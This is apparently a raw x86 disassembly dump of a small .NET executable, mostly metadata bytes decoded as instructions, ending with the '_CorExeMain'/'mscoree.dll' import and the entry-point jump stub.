  40cfcb:	01 05 04 07 01 11    	add    %eax,0x11010704
  40cfd1:	64 04 00             	fs add $0x0,%al
  40cfd4:	01 0b                	add    %ecx,(%ebx)
  40cfd6:	0a 04 00             	or     (%eax,%eax,1),%al
  40cfd9:	01 0b                	add    %ecx,(%ebx)
  40cfdb:	0e                   	push   %cs
  40cfdc:	04 00                	add    $0x0,%al
  40cfde:	01 0b                	add    %ecx,(%ebx)
  40cfe0:	0d 04 00 01 0b       	or     $0xb010004,%eax
  40cfe5:	0c 06                	or     $0x6,%al
  40cfe7:	00 01                	add    %al,(%ecx)
  40cfe9:	0b 11                	or     (%ecx),%edx
  40cfeb:	81 ad 04 00 01 0a 0a 	subl   $0x100040a,0xa010004(%ebp)
  40cff2:	04 00 01 
  40cff5:	0a 0e                	or     (%esi),%cl
  40cff7:	04 00                	add    $0x0,%al
  40cff9:	01 0a                	add    %ecx,(%edx)
  40cffb:	0d 04 00 01 0a       	or     $0xa010004,%eax
  40d000:	0c 06                	or     $0x6,%al
  40d002:	00 01                	add    %al,(%ecx)
  40d004:	0a 11                	or     (%ecx),%dl
  40d006:	81 ad 04 00 01 0d 0a 	subl   $0x100040a,0xd010004(%ebp)
  40d00d:	04 00 01 
  40d010:	0d 0e 07 07 02       	or     $0x207070e,%eax
  40d015:	11 64 11 81          	adc    %esp,-0x7f(%ecx,%edx,1)
  40d019:	ad                   	lods   %ds:(%esi),%eax
  40d01a:	05 00 01 1d 05       	add    $0x51d0100,%eax
  40d01f:	0c 07                	or     $0x7,%al
  40d021:	07                   	pop    %es
  40d022:	02 1d 05 12 81 71    	add    0x71811205,%bl
  40d028:	0d 20 04 01 0e       	or     $0xe010420,%eax
  40d02d:	11 81 75 11 82 61    	adc    %eax,0x61821175(%ecx)
  40d033:	11 82 65 0b 07 06    	adc    %eax,0x6070b65(%edx)
  40d039:	12 60 1d             	adc    0x1d(%eax),%ah
  40d03c:	0e                   	push   %cs
  40d03d:	0e                   	push   %cs
  40d03e:	08 12                	or     %dl,(%edx)
  40d040:	60                   	pusha
  40d041:	08 05 07 01 12 81    	or     %al,0x81120107
  40d047:	2d 05 07 01 12       	sub    $0x12010705,%eax
  40d04c:	81 71 07 07 04 05 1d 	xorl   $0x1d050407,0x7(%ecx)
  40d053:	05 08 08 06 00       	add    $0x60808,%eax
  40d058:	02 07                	add    (%edi),%al
  40d05a:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40d05f:	02 0c 1d 05 08 06 00 	add    0x60805(,%ebx,1),%cl
  40d066:	02 0d 1d 05 08 06    	add    0x608051d,%cl
  40d06c:	00 02                	add    %al,(%edx)
  40d06e:	09 1d 05 08 06 00    	or     %ebx,0x60805
  40d074:	02 0b                	add    (%ebx),%cl
  40d076:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40d07b:	02 06                	add    (%esi),%al
  40d07d:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40d082:	02 0a                	add    (%edx),%cl
  40d084:	1d 05 08 09 07       	sbb    $0x7090805,%eax
  40d089:	03 12                	add    (%edx),%edx
  40d08b:	81 2d 1d 05 1d 05 05 	subl   $0x12020705,0x51d051d
  40d092:	07 02 12 
  40d095:	60                   	pusha
  40d096:	02 04 07             	add    (%edi,%eax,1),%al
  40d099:	01 1d 05 05 07 02    	add    %ebx,0x2070505
  40d09f:	1d 05 08 08 07       	sbb    $0x7080805,%eax
  40d0a4:	04 1d                	add    $0x1d,%al
  40d0a6:	05 1d 05 08 05       	add    $0x508051d,%eax
  40d0ab:	06                   	push   %es
  40d0ac:	07                   	pop    %es
  40d0ad:	03 1d 05 08 05 05    	add    0x5050805,%ebx
  40d0b3:	00 01                	add    %al,(%ecx)
  40d0b5:	1d 05 0b 0f 07       	sbb    $0x70f0b05,%eax
  40d0ba:	06                   	push   %es
  40d0bb:	12 81 2d 1d 05 08    	adc    0x8051d2d(%ecx),%al
  40d0c1:	12 82 69 1d 05 1d    	adc    0x1d051d69(%edx),%al
  40d0c7:	05 08 20 02 01       	add    $0x1022008,%eax
  40d0cc:	12 61 11             	adc    0x11(%ecx),%ah
  40d0cf:	82 6d 0c 07          	subb   $0x7,0xc(%ebp)
  40d0d3:	04 12                	add    $0x12,%al
  40d0d5:	81 2d 1d 05 12 82 69 	subl   $0x51d69,0x8212051d
  40d0dc:	1d 05 00 
  40d0df:	00 08                	add    %cl,(%eax)
  40d0e1:	d1 00                	roll   $1,(%eax)
	...
  40d0eb:	00 1e                	add    %bl,(%esi)
  40d0ed:	d1 00                	roll   $1,(%eax)
  40d0ef:	00 00                	add    %al,(%eax)
  40d0f1:	20 00                	and    %al,(%eax)
	...
  40d107:	00 10                	add    %dl,(%eax)
  40d109:	d1 00                	roll   $1,(%eax)
  40d10b:	00 00                	add    %al,(%eax)
  40d10d:	00 00                	add    %al,(%eax)
  40d10f:	00 00                	add    %al,(%eax)
  40d111:	00 5f 43             	add    %bl,0x43(%edi)
  40d114:	6f                   	outsl  %ds:(%esi),(%dx)
  40d115:	72 45                	jb     0x40d15c
  40d117:	78 65                	js     0x40d17e
  40d119:	4d                   	dec    %ebp
  40d11a:	61                   	popa
  40d11b:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  40d122:	72 65                	jb     0x40d189
  40d124:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  40d128:	6c                   	insb   (%dx),%es:(%edi)
  40d129:	00 00                	add    %al,(%eax)
  40d12b:	00 00                	add    %al,(%eax)
  40d12d:	00 ff                	add    %bh,%bh
  40d12f:	25 00 20 40 00       	and    $0x402000,%eax
